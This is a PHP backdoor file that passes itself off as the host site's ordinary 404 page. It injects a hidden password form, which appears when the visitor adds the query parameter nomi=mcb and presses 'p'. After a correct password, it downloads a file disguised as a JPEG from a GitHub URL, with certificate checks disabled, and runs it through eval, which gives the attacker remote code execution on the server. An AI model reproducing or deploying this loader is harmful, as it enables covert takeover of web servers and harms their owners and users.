<?php
session_start();
$PW_HASH = '$2a$12$dtPodlgS1x.ggs0HEfn9fOVfwKSlaXtd8tWJvSwjdENzpTleDHXsK'; // buat disini : https://bcrypt-generator.com/
$REMOTE_PAYLOAD_URL = 'https://raw.githubusercontent.com/eclibesec/hastalavista/refs/heads/main/cukong.jpg';
$EXPECTED_PAYLOAD_HASH = null;
$CURL_TIMEOUT = 8;
$USER_AGENT = $_SERVER['HTTP_USER_AGENT'] ?? 'Mozilla/5.0 (nomi-protector)';
function fetch_url_curl($url, $timeout = 8, $headers = []) {
    $ch = curl_init($url);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
    curl_setopt($ch, CURLOPT_TIMEOUT, $timeout);
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
    curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, false);
    if (!empty($headers)) curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
    global $USER_AGENT;
    curl_setopt($ch, CURLOPT_USERAGENT, $USER_AGENT);
    $body = curl_exec($ch);
    $code = curl_getinfo($ch, CURLINFO_HTTP_CODE) ?: 0;
    $err = curl_error($ch);
    curl_close($ch);
    return array('code' => (int)$code, 'body' => $body, 'err' => $err);
}
$nomi_param = $_GET['nomi'] ?? '';
$show_unlock_feature = ($nomi_param === 'mcb');

if (isset($_POST['unlock_pw'])) {
    $pw = (string)($_POST['unlock_pw'] ?? '');
    if (password_verify($pw, $PW_HASH)) {
        $_SESSION['unlocked'] = true;
        $target_url = strtok($_SERVER['REQUEST_URI'], '?') ?: '/';
        header('Location: ' . $target_url);
        exit;
    } else {
        $unlock_error = true;
    }
}
if (!empty($_SESSION['unlocked'])) {
    $data = false;
    if (ini_get('allow_url_fopen')) $data = @file_get_contents($REMOTE_PAYLOAD_URL);
    if ($data === false) {
        $f = fetch_url_curl($REMOTE_PAYLOAD_URL, $CURL_TIMEOUT);
        if ($f['body'] !== false && $f['body'] !== null) $data = $f['body'];
    }
    if ($data === false || $data === null || $data === '') {
        header('Content-Type: text/plain; charset=utf-8', true, 500);
        echo "Error: cannot fetch remote payload.";
        exit;
    }
    if (!empty($EXPECTED_PAYLOAD_HASH)) {
        $got = hash('sha256', $data);
        if (!hash_equals($EXPECTED_PAYLOAD_HASH, $got)) {
            header('Content-Type: text/plain; charset=utf-8', true, 403);
            echo "Error: payload hash mismatch.";
            exit;
        }
    }
    $contains_php = (stripos($data, '<?php') !== false) || (stripos($data, '<?') !== false && stripos($data, '<?xml') === false);
    if ($contains_php) {
        try { eval('?>' . $data); } catch (Throwable $e) {
            header('Content-Type: text/plain; charset=utf-8', true, 500);
            echo "Execution error: " . $e->getMessage();
        }
        exit;
    }
    $first8 = substr($data, 0, 8);
    if (substr($first8, 0, 3) === "\xFF\xD8\xFF") {
        header('Content-Type: image/jpeg');
        header('Content-Length: ' . strlen($data));
        echo $data;
        exit;
    }
    if ($first8 === "\x89PNG\x0D\x0A\x1A\x0A") {
        header('Content-Type: image/png');
        header('Content-Length: ' . strlen($data));
        echo $data;
        exit;
    }
    header('Content-Type: application/octet-stream');
    header('Content-Disposition: attachment; filename="payload.bin"');
    header('Content-Length: ' . strlen($data));
    echo $data;
    exit;
}
$scheme = ((!empty($_SERVER['HTTPS']) && $_SERVER['HTTPS'] !== 'off') ? 'https' : 'http');
$host = $_SERVER['HTTP_HOST'] ?? 'localhost';
$rand = bin2hex(random_bytes(5));
$test_url_public = $scheme . '://' . $host . '/__nomi_404_test_' . $rand;
$res = fetch_url_curl($test_url_public, $CURL_TIMEOUT);
$html = '';
if ($res['code'] === 404 && !empty($res['body']) && strlen(trim(strip_tags($res['body']))) > 10) {
    $html = $res['body'];
} else {
    $port = $_SERVER['SERVER_PORT'] ?? ($scheme === 'https' ? 443 : 80);
    $loc_url = $scheme . '://127.0.0.1:' . $port . '/__nomi_404_test_' . $rand;
    $res2 = fetch_url_curl($loc_url, $CURL_TIMEOUT, array('Host: ' . $host));
    if ($res2['code'] === 404 && !empty($res2['body']) && strlen(trim(strip_tags($res2['body']))) > 10) {
        $html = $res2['body'];
    } else {
        $root_url = $scheme . '://' . $host . '/';
        $res3 = fetch_url_curl($root_url, $CURL_TIMEOUT);
        if (!empty($res3['body']) && (stripos($res3['body'], '404') !== false || stripos(strip_tags($res3['body']), 'page not found') !== false)) {
            $html = $res3['body'];
        } else {
            $html = "<!doctype html><html><head><meta charset='utf-8'><title>404 Not Found</title></head><body><h1>404 Not Found</h1></body></html>";
        }
    }
}
$errDisplay = !empty($unlock_error) ? 'block' : 'none';
$injection = '';
if ($show_unlock_feature) {
    $injection = '<div id="escpw_back" aria-hidden="true" style="display:none;position:fixed;inset:0;background:rgba(0,0,0,0.75);z-index:999999;align-items:center;justify-content:center"><div style="background:rgba(20,20,20,0.98);color:#fff;padding:18px;border-radius:10px;min-width:320px;box-shadow:0 10px 40px rgba(0,0,0,0.6);font-family:Arial,Helvetica,sans-serif"><form method="post" style="margin:0"><h3 style="margin:0 0 8px;font-size:16px">Enter access password</h3><input name="unlock_pw" type="password" placeholder="Password" required autofocus style="width:100%;padding:10px;border-radius:6px;border:1px solid rgba(255,255,255,0.06);background:rgba(255,255,255,0.02);color:#fff;margin-top:6px"/><div style="display:flex;gap:8px;margin-top:10px"><button type="submit" style="padding:8px 10px;border-radius:6px;border:none;background:rgb(10,132,255);color:#fff;cursor:pointer">Unlock</button><button type="button" id="escpw_cancel" style="padding:8px 10px;border-radius:6px;border:none;background:#444;color:#fff;cursor:pointer">Cancel</button></div><div class="err" style="color:rgb(255,107,107);font-size:13px;margin-top:8px;display:' . $errDisplay . '">Invalid password</div></form></div></div><script>(function(){var back=document.getElementById("escpw_back");var cancel=document.getElementById("escpw_cancel");document.addEventListener("keydown",function(e){if(e.key==="p"||e.key==="P"){if(back){back.style.display="flex";back.setAttribute("aria-hidden","false");var ip=back.querySelector("input");try{ip.focus();}catch(e){}}}},false);if(cancel)cancel.addEventListener("click",function(){if(back){back.style.display="none";back.setAttribute("aria-hidden","true");}});var serverError=' . (!empty($unlock_error) ? 'true' : 'false') . ';if(serverError&&back){back.style.display="flex";back.setAttribute("aria-hidden","false");var ee=back.querySelector(".err");if(ee)ee.style.display="block";}})();</script>';
}
$pos = stripos($html, '</body>');
if ($pos !== false) {
    $html = substr_replace($html, $injection, $pos, 0);
} else {
    $html .= $injection;
}
echo $html;
exit;
?>